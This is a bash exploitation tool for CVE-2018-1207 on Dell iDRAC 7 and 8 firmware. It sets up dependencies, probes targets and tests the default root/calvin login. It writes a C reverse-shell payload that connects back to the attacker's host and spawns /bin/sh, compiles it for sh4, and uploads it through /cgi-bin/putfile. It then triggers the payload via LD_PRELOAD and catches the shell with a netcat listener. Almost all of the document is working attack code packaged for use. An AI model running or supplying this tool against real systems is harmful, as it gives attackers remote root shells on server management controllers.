#!/bin/bash

# CVE-2018-1207 Exploit Automation Script with Password Protection
# This script automates the exploitation of Dell iDRAC 7 & 8 firmware < 2.52.52.52
# It handles dependency installation, IP detection, vulnerability scanning, and exploit execution
# Enhanced with password protection, verification, and self-healing capabilities

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Default credentials
DEFAULT_USERNAME="root"
DEFAULT_PASSWORD="calvin"

# Password management configuration
CONFIG_DIR="$HOME/.cve-2018-1207"
PASSWORD_FILE="$CONFIG_DIR/password.hash"
MAX_ATTEMPTS=3
PASSWORD_MIN_LENGTH=8

# Function to print colored messages
print_info() {
    echo -e "${BLUE}[*] $1${NC}"
}

print_success() {
    echo -e "${GREEN}[+] $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

print_error() {
    echo -e "${RED}[-] $1${NC}"
}

# Function to log messages to a file
log_message() {
    local level=$1
    local message=$2
    local log_file="$CONFIG_DIR/exploitation.log"
    
    # Create log file if it doesn't exist
    if [ ! -f "$log_file" ]; then
        mkdir -p "$CONFIG_DIR"
        echo "CVE-2018-1207 Exploitation Log - $(date)" > "$log_file"
        echo "=======================================" >> "$log_file"
        echo "" >> "$log_file"
    fi
    
    # Append message to log file
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$level] $message" >> "$log_file"
}

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to check and install dependencies
install_dependencies() {
    print_info "Checking and installing dependencies..."
    log_message "INFO" "Checking and installing dependencies"
    
    local missing_deps=()
    
    # Check for Python
    if ! command_exists python && ! command_exists python3; then
        missing_deps+=("python3")
    fi
    
    # Check for Python requests module
    if ! python3 -c "import requests" 2>/dev/null; then
        missing_deps+=("python3-requests")
    fi
    
    # Check for Python urllib3 module
    if ! python3 -c "import urllib3" 2>/dev/null; then
        missing_deps+=("python3-urllib3")
    fi
    
    # Check for netcat
    if ! command_exists nc; then
        missing_deps+=("netcat")
    fi
    
    # Check for sh4-linux-gnu-gcc
    if ! command_exists sh4-linux-gnu-gcc && ! command_exists sh4-linux-gnu-gcc-11; then
        missing_deps+=("gcc-11-sh4-linux-gnu")
    fi
    
    # Check for curl
    if ! command_exists curl; then
        missing_deps+=("curl")
    fi
    
    # Check for nmap
    if ! command_exists nmap; then
        missing_deps+=("nmap")
    fi
    
    # Check for sha256sum (for password hashing)
    if ! command_exists sha256sum; then
        missing_deps+=("coreutils")
    fi
    
    # Install missing dependencies
    if [ ${#missing_deps[@]} -gt 0 ]; then
        print_info "Installing missing dependencies: ${missing_deps[*]}"
        log_message "INFO" "Installing missing dependencies: ${missing_deps[*]}"
        
        sudo apt update
        for dep in "${missing_deps[@]}"; do
            print_info "Installing $dep..."
            sudo apt install -y $dep
            if [ $? -ne 0 ]; then
                print_error "Failed to install $dep. Please install it manually."
                log_message "ERROR" "Failed to install $dep"
                
                # Self-healing: Try alternative installation methods
                case $dep in
                    python3-requests|python3-urllib3)
                        print_info "Attempting to install via pip..."
                        sudo apt install -y python3-pip
                        pip3 install ${dep#python3-}
                        ;;
                    *)
                        print_warning "No alternative installation method available for $dep"
                        ;;
                esac
                
                # Check if installation succeeded with alternative method
                if [ $? -ne 0 ]; then
                    exit 1
                fi
            fi
        done
    fi
    
    print_success "All dependencies installed successfully."
    log_message "SUCCESS" "All dependencies installed successfully"
}

# Function to get the local IP address
get_local_ip() {
    # Try multiple methods to get the local IP
    local_ip=""
    
    # Method 1: Using hostname
    if command_exists hostname; then
        local_ip=$(hostname -I | awk '{print $1}')
    fi
    
    # Method 2: Using ip command
    if [ -z "$local_ip" ] && command_exists ip; then
        local_ip=$(ip route get 1 | awk '{print $7; exit}')
    fi
    
    # Method 3: Using ifconfig
    if [ -z "$local_ip" ] && command_exists ifconfig; then
        local_ip=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n 1)
    fi
    
    # If all methods fail, ask the user
    if [ -z "$local_ip" ]; then
        print_warning "Could not automatically detect local IP address."
        log_message "WARNING" "Could not automatically detect local IP address"
        read -p "Please enter your local IP address: " local_ip
        if [ -z "$local_ip" ]; then
            print_error "No IP address provided. Exiting."
            log_message "ERROR" "No IP address provided"
            exit 1
        fi
    fi
    
    echo "$local_ip"
}

# Function to find an available port
find_available_port() {
    local start_port=${1:-4444}
    local max_attempts=${2:-100}
    local port=$start_port
    local attempts=0
    
    print_info "Finding an available port starting from $start_port..."
    log_message "INFO" "Finding an available port starting from $start_port"
    
    while [ $attempts -lt $max_attempts ]; do
        # Check if port is in use
        if ! netstat -tuln | grep -q ":$port "; then
            print_success "Found available port: $port"
            log_message "SUCCESS" "Found available port: $port"
            return $port
        fi
        
        port=$((port + 1))
        attempts=$((attempts + 1))
    done
    
    print_error "Could not find an available port after $max_attempts attempts."
    log_message "ERROR" "Could not find an available port after $max_attempts attempts"
    return 1
}

# Password Management Functions

# Function to hash a password
hash_password() {
    local password=$1
    local salt=$(date +%s | sha256sum | head -c 16)
    local hash=$(echo -n "${password}${salt}" | sha256sum | awk '{print $1}')
    echo "${hash}:${salt}"
}

# Function to verify a password
verify_password() {
    local password=$1
    local stored_hash=$(cut -d':' -f1 < "$PASSWORD_FILE")
    local salt=$(cut -d':' -f2 < "$PASSWORD_FILE")
    local input_hash=$(echo -n "${password}${salt}" | sha256sum | awk '{print $1}')
    
    if [ "$input_hash" = "$stored_hash" ]; then
        return 0
    else
        return 1
    fi
}

# Function to set a new password
set_password() {
    local password=""
    local confirm=""
    local attempts=0
    
    while [ $attempts -lt $MAX_ATTEMPTS ]; do
        # Get password from user
        read -s -p "Enter new password (min. $PASSWORD_MIN_LENGTH characters): " password
        echo
        
        # Validate password length
        if [ ${#password} -lt $PASSWORD_MIN_LENGTH ]; then
            print_error "Password is too short. Must be at least $PASSWORD_MIN_LENGTH characters."
            attempts=$((attempts + 1))
            continue
        fi
        
        # Confirm password
        read -s -p "Confirm password: " confirm
        echo
        
        if [ "$password" = "$confirm" ]; then
            # Hash and store password
            mkdir -p "$CONFIG_DIR"
            chmod 700 "$CONFIG_DIR"
            hash_password "$password" > "$PASSWORD_FILE"
            chmod 600 "$PASSWORD_FILE"
            
            print_success "Password set successfully."
            log_message "INFO" "Password set successfully"
            return 0
        else
            print_error "Passwords do not match."
            attempts=$((attempts + 1))
        fi
    done
    
    print_error "Maximum password attempts reached. Exiting."
    log_message "ERROR" "Maximum password attempts reached during password setting"
    return 1
}

# Function to change password
change_password() {
    local current_password=""
    local attempts=0
    
    # Verify current password
    while [ $attempts -lt $MAX_ATTEMPTS ]; do
        read -s -p "Enter current password: " current_password
        echo
        
        if verify_password "$current_password"; then
            # Set new password
            set_password
            return $?
        else
            print_error "Incorrect password."
            attempts=$((attempts + 1))
        fi
    done
    
    print_error "Maximum password attempts reached. Exiting."
    log_message "ERROR" "Maximum password attempts reached during password change"
    return 1
}

# Function to initialize password configuration
init_password_config() {
    # Create config directory if it doesn't exist
    if [ ! -d "$CONFIG_DIR" ]; then
        mkdir -p "$CONFIG_DIR"
        chmod 700 "$CONFIG_DIR"
        log_message "INFO" "Created password configuration directory"
    fi
    
    # Check if password file exists
    if [ ! -f "$PASSWORD_FILE" ]; then
        print_info "No password has been set. Setting up initial password."
        set_password
    fi
}

# Function to authenticate user
authenticate() {
    local password=""
    local attempts=0
    
    # Check if password file exists
    if [ ! -f "$PASSWORD_FILE" ]; then
        print_warning "No password has been set. Setting up initial password."
        set_password
        return $?
    fi
    
    # Verify password
    while [ $attempts -lt $MAX_ATTEMPTS ]; do
        read -s -p "Enter password: " password
        echo
        
        if verify_password "$password"; then
            print_success "Authentication successful."
            log_message "INFO" "Authentication successful"
            return 0
        else
            print_error "Incorrect password."
            attempts=$((attempts + 1))
        fi
    done
    
    print_error "Maximum password attempts reached. Exiting."
    log_message "ERROR" "Maximum password attempts reached during authentication"
    return 1
}

# Function to test password system integrity
test_password_system() {
    print_info "Testing password system integrity..."
    log_message "INFO" "Testing password system integrity"
    
    # Check if config directory exists
    if [ ! -d "$CONFIG_DIR" ]; then
        print_warning "Configuration directory does not exist. Creating..."
        mkdir -p "$CONFIG_DIR"
        chmod 700 "$CONFIG_DIR"
        log_message "WARNING" "Created missing configuration directory"
    fi
    
    # Check if password file exists
    if [ ! -f "$PASSWORD_FILE" ]; then
        print_warning "Password file does not exist. Password system needs initialization."
        log_message "WARNING" "Password file missing"
        return 1
    fi
    
    # Check password file format
    if ! grep -q ":" "$PASSWORD_FILE"; then
        print_error "Password file format is invalid."
        log_message "ERROR" "Invalid password file format"
        return 1
    fi
    
    # Check password file permissions
    file_perms=$(stat -c "%a" "$PASSWORD_FILE")
    if [ "$file_perms" != "600" ]; then
        print_warning "Password file has incorrect permissions. Fixing..."
        chmod 600 "$PASSWORD_FILE"
        log_message "WARNING" "Fixed password file permissions"
    fi
    
    # Check config directory permissions
    dir_perms=$(stat -c "%a" "$CONFIG_DIR")
    if [ "$dir_perms" != "700" ]; then
        print_warning "Configuration directory has incorrect permissions. Fixing..."
        chmod 700 "$CONFIG_DIR"
        log_message "WARNING" "Fixed configuration directory permissions"
    fi
    
    print_success "Password system integrity check completed."
    log_message "INFO" "Password system integrity check completed"
    return 0
}

# Function to repair password system
repair_password_system() {
    print_info "Attempting to repair password system..."
    log_message "INFO" "Attempting to repair password system"
    
    # Create config directory if it doesn't exist
    if [ ! -d "$CONFIG_DIR" ]; then
        mkdir -p "$CONFIG_DIR"
        chmod 700 "$CONFIG_DIR"
        log_message "INFO" "Created missing configuration directory"
    fi
    
    # Check if password file exists and is valid
    if [ ! -f "$PASSWORD_FILE" ] || ! grep -q ":" "$PASSWORD_FILE"; then
        print_warning "Password file is missing or invalid. Setting up a new password."
        log_message "WARNING" "Password file missing or invalid, setting up new password"
        set_password
        return $?
    fi
    
    # Fix permissions
    chmod 700 "$CONFIG_DIR"
    chmod 600 "$PASSWORD_FILE"
    
    print_success "Password system repaired successfully."
    log_message "INFO" "Password system repaired successfully"
    return 0
}

# Exploit Functions

# Function to create the exploit files
create_exploit_files() {
    print_info "Creating exploit files..."
    log_message "INFO" "Creating exploit files"
    
    # Create temporary directory for exploit files
    local temp_dir="$CONFIG_DIR/exploit_files"
    mkdir -p "$temp_dir"
    
    # Create payload.c template
    cat > "$temp_dir/payload.c.template" << 'EOF'
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

static void main(void) __attribute__((constructor));
static void main(void)
{
    int pid = fork();
    if(!pid) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in serv_addr = {0};
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT_PLACEHOLDER);
        serv_addr.sin_addr.s_addr = inet_addr("IP_PLACEHOLDER");
        connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        execl("/bin/sh", "/bin/sh", NULL);
    }
}
EOF
    
    # Create Python vulnerability checker script
    cat > "$temp_dir/check_vulnerability.py" << 'EOF'
#!/usr/bin/env python3
# CVE-2018-1207 Vulnerability Checker
# Checks if a Dell iDRAC 7/8 server is vulnerable to CVE-2018-1207

import requests
import sys
import re
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_vulnerability(host, port=443, timeout=10):
    url = f'https://{host}:{port}'
    
    try:
        r = requests.get(f'{url}/cgi-bin/login?LD_DEBUG=files', verify=False, timeout=timeout)
        vul = re.search(r'calling init: /lib/', r.text)
        if vul:
            return True
        else:
            return False
    except Exception as e:
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 check_vulnerability.py <host> [port]")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    
    if check_vulnerability(host, port):
        print("VULNERABLE")
        sys.exit(0)
    else:
        print("NOT_VULNERABLE")
        sys.exit(1)
EOF
    
    # Create Python credential verifier script
    cat > "$temp_dir/verify_credentials.py" << 'EOF'
#!/usr/bin/env python3
# iDRAC Credential Verifier
# Verifies if the provided credentials work for iDRAC login

import requests
import sys
import re
import urllib3
import base64
import time

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def verify_credentials(host, port=443, username="root", password="calvin", timeout=10, retries=3):
    url = f'https://{host}:{port}/login.html'
    auth_url = f'https://{host}:{port}/data/login'
    
    # Retry mechanism with exponential backoff
    for attempt in range(retries):
        try:
            # First get the login page to establish session
            session = requests.Session()
            r = session.get(url, verify=False, timeout=timeout)
            
            # Prepare login data
            auth_data = {
                'user': username,
                'password': password
            }
            
            # Attempt login
            r = session.post(auth_url, json=auth_data, verify=False, timeout=timeout)
            
            # Check if login was successful
            if r.status_code == 200 and "authResult" in r.text:
                if '"authResult":0' in r.text:
                    return True
                else:
                    return False
            else:
                # If we get here, the response format wasn't as expected
                # Try alternative authentication method for older firmware
                auth_header = f"Basic {base64.b64encode(f'{username}:{password}'.encode()).decode()}"
                headers = {"Authorization": auth_header}
                r = session.get(url, headers=headers, verify=False, timeout=timeout)
                
                # Check if we got a successful response
                if r.status_code == 200 and not "login.html" in r.text:
                    return True
                
                # If we're not at the last retry, wait before trying again
                if attempt < retries - 1:
                    wait_time = 2 ** attempt  # Exponential backoff
                    time.sleep(wait_time)
                    continue
                else:
                    return False
                
        except Exception as e:
            # If we're not at the last retry, wait before trying again
            if attempt < retries - 1:
                wait_time = 2 ** attempt  # Exponential backoff
                time.sleep(wait_time)
                continue
            else:
                return False
    
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 verify_credentials.py <host> [port] [username] [password]")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    username = sys.argv[3] if len(sys.argv) > 3 else "root"
    password = sys.argv[4] if len(sys.argv) > 4 else "calvin"
    
    if verify_credentials(host, port, username, password):
        print("CREDENTIALS_VALID")
        sys.exit(0)
    else:
        print("CREDENTIALS_INVALID")
        sys.exit(1)
EOF
    
    # Create Python exploit script
    cat > "$temp_dir/cve-2018-1207.py" << 'EOF'
# Dell iDRAC7 and iDRAC8 Devices Code Injection Vulnerability (RCE)
# Vulnerable version firmware: <  2.52.52.52
# CVE number: CVE-2018-1207

import requests
import sys
import os
import re
import struct
import urllib3
import time
import socket

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print("""
 ____  _____ _     _     ____  ____      _    ____  
|  _ \| ____| |   | |   |  _ \|  _ \    / \  / ___| 
| | | |  _| | |   | |   | | | | |_) |  / _ \ \___ \ 
| |_| | |___| |___| |___| |_| |  _ <  / ___ \ ___) |
|____/|_____|_____|_____|____/|_| \_\/_/   \_\____/ 
                                                    
  _____  __  __ ____  _     ___ ___ _____ 
 | ____|/ _|/ _/ ___|| |   / _ \_ _|_   _|
 |  _| | |_| |\___ \| |  | | | | |  | |  
 | |___|  _| | ___) | |__| |_| | |  | |  
 |_____|_| |_||____/|_____\___/___| |_|  
                                         
""")

try:
    host = sys.argv[1]
    port = sys.argv[2]
    lhost = sys.argv[3]
    lport = sys.argv[4]
except:
    print("Usage: python ./CVE-2018-1207.py <remote_host> <remote_port> <local_host> <local_port>   ")
    print("       python ./CVE-2018-1207.py 192.168.1.10 443 192.168.1.200 5500")
    print("       nc -v -l -p <local_port>                                      ")
    exit()

payloadbin = 'payload.so'
payloadc = 'payload.c'
timeout = 10
url = 'https://' + str(host) + ':' + str(port)

# Retry mechanism for initial connection
max_retries = 3
for attempt in range(max_retries):
    try:
        r = requests.get(url + '/cgi-bin/login?LD_DEBUG=files', verify=False, timeout=timeout)
        break
    except Exception as e:
        if attempt < max_retries - 1:
            print(f"Connection attempt {attempt+1} failed. Retrying in {2**attempt} seconds...")
            time.sleep(2**attempt)  # Exponential backoff
        else:
            print("An error connecting to the server " + str(url))
            exit()

vul = re.search(r'calling init: /lib/', r.text)
if vul:
    print('[+] Server ' + str(url) + ' is vulnerable')
else:
    print('[-] Server ' + str(url) + ' is not vulnerable')
    exit()

print("Generate Payload")

if os.path.exists(payloadc):
    os.unlink(payloadc)

# Read the payload template and replace placeholders
with open('payload.c.template', 'r') as template_file:
    payload_template = template_file.read()

# Replace placeholders with actual values
payload = payload_template.replace('PORT_PLACEHOLDER', lport).replace('IP_PLACEHOLDER', lhost)

with open(payloadc, 'w') as file:
    file.write(payload)

if os.path.exists(payloadc):
    # Try multiple compiler names with fallback
    compilers = ['sh4-linux-gnu-gcc-11', 'sh4-linux-gnu-gcc']
    success = False
    
    for compiler in compilers:
        if os.system(f'which {compiler} > /dev/null 2>&1') == 0:
            cmd = os.system(f'{compiler} -shared -fPIC ./payload.c -o ./payload.so')
            exit_code = os.WEXITSTATUS(cmd)
            if exit_code == 0:
                print(f"[+] Generated payload using {compiler}.")
                success = True
                break
    
    if not success:
        print("[!] Error generate payload. Need the package gcc-11-sh4-linux-gnu (apt-get install gcc-11-sh4-linux-gnu)")
        exit()
else:
    print("[!] Error generate payload. Please check the permissions and owner of that directory.")
    exit()

FFLAGS = 1
f = open(payloadbin, 'rb')
payload_so = f.read()
f.close()

f_alias = 'RACPKSSHAUTHORKEY1'
res = bytes((f_alias + (32 - len(f_alias)) * '\0'),'utf-8')
res += struct.pack('<L', len(payload_so))
res += struct.pack('<L', FFLAGS)
res += payload_so

print("Upload payload")
# Retry mechanism for payload upload
max_retries = 3
for attempt in range(max_retries):
    try:
        r = requests.post(url + '/cgi-bin/putfile', data=res, verify=False, timeout=timeout)
        if r.status_code == 200:
            break
        else:
            if attempt < max_retries - 1:
                print(f"Upload attempt {attempt+1} failed. Retrying in {2**attempt} seconds...")
                time.sleep(2**attempt)  # Exponential backoff
            else:
                print("[-] Error uploading payload")
                exit()
    except Exception as e:
        if attempt < max_retries - 1:
            print(f"Upload attempt {attempt+1} failed. Retrying in {2**attempt} seconds...")
            time.sleep(2**attempt)  # Exponential backoff
        else:
            print("[-] Error: " + str(e))
            exit()

if r.status_code == 200:
    print("[+] OK")
else:
    print("[-] Error")
    exit()

print("Execute payload")
r = requests.get(url + '/cgi-bin/login?LD_PRELOAD=/tmp/RACPKSSHAUTHORKEY1', verify=False, timeout=timeout)
print("[+] Done")
EOF
    
    # Make scripts executable
    chmod +x "$temp_dir/check_vulnerability.py"
    chmod +x "$temp_dir/verify_credentials.py"
    
    print_success "Exploit files created successfully."
    log_message "SUCCESS" "Exploit files created successfully"
}

# Function to check if a target is vulnerable
check_target_vulnerability() {
    local target_host=$1
    local target_port=$2
    
    print_info "Checking if $target_host:$target_port is vulnerable to CVE-2018-1207..."
    log_message "INFO" "Checking vulnerability of $target_host:$target_port"
    
    # Run the vulnerability checker
    local temp_dir="$CONFIG_DIR/exploit_files"
    local result=$(python3 "$temp_dir/check_vulnerability.py" "$target_host" "$target_port")
    
    if [ "$result" = "VULNERABLE" ]; then
        print_success "Target $target_host:$target_port is vulnerable to CVE-2018-1207."
        log_message "SUCCESS" "Target $target_host:$target_port is vulnerable"
        return 0
    else
        print_error "Target $target_host:$target_port is not vulnerable to CVE-2018-1207."
        log_message "ERROR" "Target $target_host:$target_port is not vulnerable"
        return 1
    fi
}

# Function to verify target credentials
verify_target_credentials() {
    local target_host=$1
    local target_port=$2
    local username=$3
    local password=$4
    
    print_info "Verifying credentials for $target_host:$target_port..."
    log_message "INFO" "Verifying credentials for $target_host:$target_port"
    
    # Run the credential verifier
    local temp_dir="$CONFIG_DIR/exploit_files"
    local result=$(python3 "$temp_dir/verify_credentials.py" "$target_host" "$target_port" "$username" "$password")
    
    if [ "$result" = "CREDENTIALS_VALID" ]; then
        print_success "Credentials are valid for $target_host:$target_port."
        log_message "SUCCESS" "Credentials are valid for $target_host:$target_port"
        return 0
    else
        print_error "Credentials are invalid for $target_host:$target_port."
        log_message "ERROR" "Credentials are invalid for $target_host:$target_port"
        return 1
    fi
}

# Function to start a netcat listener
start_netcat_listener() {
    local port=$1
    local log_file="$CONFIG_DIR/netcat_$port.log"
    
    print_info "Starting netcat listener on port $port..."
    log_message "INFO" "Starting netcat listener on port $port"
    
    # Start netcat in background
    nc -lvnp $port > "$log_file" 2>&1 &
    local nc_pid=$!
    
    # Store PID for later cleanup
    echo $nc_pid > "$CONFIG_DIR/netcat_$port.pid"
    
    print_success "Netcat listener started on port $port (PID: $nc_pid)."
    log_message "SUCCESS" "Netcat listener started on port $port (PID: $nc_pid)"
    
    return $nc_pid
}

# Function to check if a port is available
is_port_available() {
    local port=$1
    
    if netstat -tuln | grep -q ":$port "; then
        return 1
    else
        return 0
    fi
}

# Function to find an available port
find_available_port() {
    local start_port=${1:-4444}
    local end_port=${2:-5000}
    local port=$start_port
    
    print_info "Finding an available port between $start_port and $end_port..."
    log_message "INFO" "Finding an available port between $start_port and $end_port"
    
    while [ $port -le $end_port ]; do
        if is_port_available $port; then
            print_success "Found available port: $port"
            log_message "SUCCESS" "Found available port: $port"
            echo $port
            return 0
        fi
        port=$((port + 1))
    done
    
    print_error "Could not find an available port between $start_port and $end_port."
    log_message "ERROR" "Could not find an available port between $start_port and $end_port"
    return 1
}

# Function to run the exploit
run_exploit() {
    local target_host=$1
    local target_port=$2
    local local_host=$3
    local local_port=$4
    
    print_info "Running exploit against $target_host:$target_port..."
    log_message "INFO" "Running exploit against $target_host:$target_port"
    
    # Change to the exploit directory
    local temp_dir="$CONFIG_DIR/exploit_files"
    cd "$temp_dir"
    
    # Run the exploit
    python3 "$temp_dir/cve-2018-1207.py" "$target_host" "$target_port" "$local_host" "$local_port"
    
    # Return to the original directory
    cd - > /dev/null
}

# Function to display the main menu
show_menu() {
    clear
    echo "=============================================="
    echo "  CVE-2018-1207 Exploit Tool - Secure Version"
    echo "=============================================="
    echo "1. Set/Change Password"
    echo "2. Test Password System"
    echo "3. Repair Password System"
    echo "4. Run Exploit"
    echo "5. Check Target Vulnerability"
    echo "6. Verify Target Credentials"
    echo "7. Install Dependencies"
    echo "8. Exit"
    echo "=============================================="
    read -p "Enter your choice [1-8]: " choice
    
    case $choice in
        1)
            if [ -f "$PASSWORD_FILE" ]; then
                change_password
            else
                set_password
            fi
            read -p "Press Enter to continue..."
            show_menu
            ;;
        2)
            test_password_system
            read -p "Press Enter to continue..."
            show_menu
            ;;
        3)
            repair_password_system
            read -p "Press Enter to continue..."
            show_menu
            ;;
        4)
            # Authenticate before running exploit
            if authenticate; then
                # Get target information
                read -p "Enter target host: " target_host
                read -p "Enter target port [443]: " target_port
                target_port=${target_port:-443}
                
                # Get local information
                local_host=$(get_local_ip)
                
                # Find an available port automatically
                local_port=$(find_available_port 4444 5000)
                if [ $? -ne 0 ]; then
                    print_error "Could not find an available port. Please free up some ports and try again."
                    read -p "Press Enter to continue..."
                    show_menu
                    return
                fi
                
                print_info "Using local IP: $local_host and port: $local_port for reverse shell"
                
                # Create exploit files if they don't exist
                if [ ! -d "$CONFIG_DIR/exploit_files" ]; then
                    create_exploit_files
                fi
                
                # Check if target is vulnerable
                if check_target_vulnerability "$target_host" "$target_port"; then
                    # Start netcat listener
                    print_info "Starting netcat listener on port $local_port..."
                    start_netcat_listener $local_port
                    
                    print_info "Netcat listener started. Running exploit..."
                    sleep 2
                    
                    # Run the exploit
                    run_exploit "$target_host" "$target_port" "$local_host" "$local_port"
                    
                    print_info "Exploit executed. Check the netcat listener for a connection."
                    print_info "Netcat output is being logged to $CONFIG_DIR/netcat_$local_port.log"
                fi
            fi
            read -p "Press Enter to continue..."
            show_menu
            ;;
        5)
            # Authenticate before checking vulnerability
            if authenticate; then
                read -p "Enter target host: " target_host
                read -p "Enter target port [443]: " target_port
                target_port=${target_port:-443}
                
                # Create exploit files if they don't exist
                if [ ! -d "$CONFIG_DIR/exploit_files" ]; then
                    create_exploit_files
                fi
                
                check_target_vulnerability "$target_host" "$target_port"
            fi
            read -p "Press Enter to continue..."
            show_menu
            ;;
        6)
            # Authenticate before verifying credentials
            if authenticate; then
                read -p "Enter target host: " target_host
                read -p "Enter target port [443]: " target_port
                target_port=${target_port:-443}
                read -p "Enter username [root]: " username
                username=${username:-root}
                read -s -p "Enter password [calvin]: " password
                echo
                password=${password:-calvin}
                
                # Create exploit files if they don't exist
                if [ ! -d "$CONFIG_DIR/exploit_files" ]; then
                    create_exploit_files
                fi
                
                verify_target_credentials "$target_host" "$target_port" "$username" "$password"
            fi
            read -p "Press Enter to continue..."
            show_menu
            ;;
        7)
            install_dependencies
            read -p "Press Enter to continue..."
            show_menu
            ;;
        8)
            print_info "Exiting..."
            exit 0
            ;;
        *)
            print_error "Invalid choice. Please try again."
            read -p "Press Enter to continue..."
            show_menu
            ;;
    esac
}

# Function to display the banner
show_banner() {
    clear
    echo -e "${BLUE}"
    echo "  ____  _____ _     _     _ ____  ____      _    ____ "
    echo " |  _ \| ____| |   | |   (_)  _ \|  _ \    / \  / ___|"
    echo " | | | |  _| | |   | |   | | | | | |_) |  / _ \| |    "
    echo " | |_| | |___| |___| |___| | |_| |  _ <  / ___ \ |___ "
    echo " |____/|_____|_____|_____|_|____/|_| \_\/_/   \_\____|"
    echo "                                                      "
    echo "  _____  __  __ ____  _     ___ ___ _____             "
    echo " | ____|/ _|/ _/ ___|| |   / _ \_ _|_   _|            "
    echo " |  _| | |_| |\___ \| |  | | | | |  | |              "
    echo " | |___|  _| | ___) | |__| |_| | |  | |              "
    echo " |_____|_| |_||____/|_____\___/___| |_|              "
    echo "                                                      "
    echo -e "${NC}"
    echo " CVE-2018-1207 Exploit Tool - Secure Version"
    echo " Dell iDRAC 7/8 Remote Code Execution Vulnerability"
    echo " Firmware versions < 2.52.52.52 are vulnerable"
    echo " Enhanced with password protection and self-healing"
    echo ""
}

# Main function
main() {
    show_banner
    
    # Check if running with root privileges
    if [ "$EUID" -eq 0 ]; then
        print_warning "Running as root is not recommended for security reasons."
        read -p "Do you want to continue anyway? (y/n): " continue_as_root
        if [ "$continue_as_root" != "y" ] && [ "$continue_as_root" != "Y" ]; then
            print_info "Exiting..."
            exit 0
        fi
    fi
    
    # Install dependencies
    print_info "Checking dependencies..."
    install_dependencies
    
    # Initialize password configuration
    init_password_config
    
    # Test password system integrity
    if ! test_password_system; then
        print_warning "Password system integrity check failed. Attempting repair..."
        if ! repair_password_system; then
            print_error "Failed to repair password system. Please check permissions and try again."
            exit 1
        fi
    fi
    
    # Show the main menu
    show_menu
}

# Run the main function
main "$@"
